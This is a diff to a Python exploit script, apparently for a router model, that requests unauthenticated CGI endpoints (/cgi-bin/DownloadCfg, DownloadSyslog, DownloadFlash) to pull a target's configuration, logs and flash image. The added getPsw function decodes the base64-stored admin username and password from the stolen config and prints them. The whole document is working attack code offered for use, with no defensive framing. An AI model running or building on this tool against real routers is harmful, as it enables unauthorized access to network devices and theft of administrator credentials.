@@ -1,6 +1,7 @@
 #github.com/4d000
 import socket
 import optparse
+import base64
 
 def getArgs():
     parser=optparse.OptionParser()
@@ -8,11 +9,11 @@ def getArgs():
     parser.add_option("-c","--config",action="store_true",dest="config",help="Get cfg file")
     parser.add_option("-l","--log",action="store_true",dest="log",help="Get log file")
     parser.add_option("-f","--flash",action="store_true",dest="flash",help="Get flash dump")
-
+    parser.add_option("-p","--password",action="store_true",dest="psw",help="Get admin password")
     (options, arguements)=parser.parse_args()
     if not options.target:
         parser.error("No Target IP Address")
-    if not options.config and not options.log and not options.flash:
+    if not options.config and not options.log and not options.flash and not options.psw:
         parser.error("What should it do??? use -c or -l or -f (check -h)")
     return options
 
@@ -43,18 +44,35 @@ def getFile(target,port,request,filename):
     else:
         print("Error: Headers not found in the response.")
 
-    #TO DO
-    def setPsw():
-        pass
+    
+def getPsw():
+    try:
+        with open("RouterCfm.cfg","r") as f:
+            username=""
+            password=""
+            for line in f:
+                if "http_username=" in line:
+                    username=line.replace("http_username=","").strip()
+                elif "http_passwd=" in line:
+                    password=base64.b64decode(line.replace("http_passwd=","")).decode("utf-8").strip()
+            print(f"Username: {username}\nPassword: {password}")
+    except FileNotFoundError:
+        print("Cfg file not found, use -c or --config")
+        
+#to do
+def setPsw(newPsw):
+    pass
 
 if __name__=="__main__":
     options=getArgs()
     target=options.target
     port=80
+
     if options.config:
         getFile(target,port,b"GET /cgi-bin/DownloadCfg HTTP/1.0\r\n\r\n","RouterCfm.cfg")
     if options.log:
         getFile(target,port,b"GET /cgi-bin/DownloadSyslog HTTP/1.0\r\n\r\n","RouterSystem.log")
     if options.flash:
         getFile(target,port,b"GET /cgi-bin/DownloadFlash HTTP/1.0\r\n\r\n","RouterFlash.bin")
-
+    if options.psw:
+        getPsw()
